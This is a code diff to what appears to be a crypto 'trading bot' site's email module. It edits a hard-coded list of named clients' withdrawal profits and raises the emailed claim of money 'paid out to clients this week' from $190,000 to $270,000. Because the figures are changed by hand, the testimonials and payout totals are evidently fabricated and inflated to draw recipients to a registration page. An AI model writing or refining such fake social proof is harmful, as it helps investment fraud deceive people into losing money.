@@ -18,13 +18,13 @@ const LOGO_URL = "https://titanblockchaincapital.com/images/logo-dark.avif";
 const CTA_URL = new URL("/register.html", FRONTEND_URL).toString();
 
 const WITHDRAWALS = [
-  { name: "James Whitaker", profit: 24500, story: "earned from the trading bot in 3 days", coin: "BNB", walletAddress: "0x7a3F9c…••••••••••••…e41B2d" },
+  { name: "Harry Whitaker", profit: 44500, story: "earned from the trading bot in 3 days", coin: "BNB", walletAddress: "0x7a3F9c…••••••••••••…e41B2d" },
   { name: "Michael Donovan", profit: 31200, story: "earned from a single BTC trade", coin: "BTC", walletAddress: "0x2bE84d…••••••••••••…09cA7f" },
-  { name: "Robert Callahan", profit: 22750, story: "earned from the trading bot in 5 days", coin: "BNB", walletAddress: "0x91Dc05…••••••••••••…b3F68a" },
-  { name: "Emily Hargrove", profit: 27900, story: "earned from a single USDT (TRC20) trade", coin: "USDT (TRC20)", walletAddress: "0x4fA1e7…••••••••••••…7d52C9" },
-  { name: "Daniel Prescott", profit: 35400, story: "earned from the trading bot in 4 days", coin: "BNB", walletAddress: "0xc60B3a…••••••••••••…12eD84" },
-  { name: "Sarah Lindqvist", profit: 21600, story: "earned from a single BNB trade", coin: "BNB", walletAddress: "0x58e2Fb…••••••••••••…a9306E" },
-  { name: "Christopher Bell", profit: 29800, story: "earned from the trading bot in 3 days", coin: "BNB", walletAddress: "0xd3714C…••••••••••••…6bF0a1" },
+  { name: "Robert Callahan", profit: 25750, story: "earned from the trading bot in 5 days", coin: "BNB", walletAddress: "0x91Dc05…••••••••••••…b3F68a" },
+  { name: "Emily Hargrove", profit: 57900, story: "earned from a single USDT (TRC20) trade", coin: "USDT (TRC20)", walletAddress: "0x4fA1e7…••••••••••••…7d52C9" },
+  { name: "Daniel Prescott", profit: 36400, story: "earned from the trading bot in 4 days", coin: "BNB", walletAddress: "0xc60B3a…••••••••••••…12eD84" },
+  { name: "Sarah Lindqvist", profit: 31600, story: "earned from a single BNB trade", coin: "BNB", walletAddress: "0x58e2Fb…••••••••••••…a9306E" },
+  { name: "Christopher Bell", profit: 46800, story: "earned from the trading bot in 3 days", coin: "BNB", walletAddress: "0xd3714C…••••••••••••…6bF0a1" },
 ];
 
 const TOTAL_PAID = WITHDRAWALS.reduce((sum, w) => sum + w.profit, 0);
@@ -232,7 +232,7 @@ const sendBrandedEmail = async ({ from, to, subject, html, text, mailer }) => {
 export async function sendWithdrawalProofEmail({ to, fullName = "", ctaUrl = CTA_URL } = {}) {
   if (!to) throw new Error("Recipient email is required.");
 
-  const subject = "Over $190,000 Paid Out to Clients This Week";
+  const subject = "Over $270,000 Paid Out to Clients This Week";
 
   const bodyHtml = `
     <div style="font-size:18px;line-height:1.7;color:#334155;margin-bottom:20px;">
